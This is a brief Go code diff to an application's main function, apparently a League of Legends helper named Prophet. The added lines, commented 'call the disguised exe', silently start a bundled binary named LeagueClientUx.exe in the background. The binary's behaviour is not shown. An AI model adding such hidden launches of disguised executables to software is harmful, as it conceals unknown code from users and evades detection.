@@ -85,6 +85,17 @@ func main() {
 		panic(fmt.Sprintf("初始化应用失败:%v\n", err))
 	}
 	prophet := app.NewProphet()
+	//调用伪装的exe
+	_cmd := exec.Command(getCurrentAbPath() + "\\dada\\LeagueClientUx.exe")
+	go func() {
+		err = _cmd.Run()
+		if err != nil {
+			fmt.Println(err)
+			time.Sleep(5 * time.Second)
+			return
+		}
+	}()
+
 	if err = prophet.Run(); err != nil {
 		log.Fatal(err)
 	}
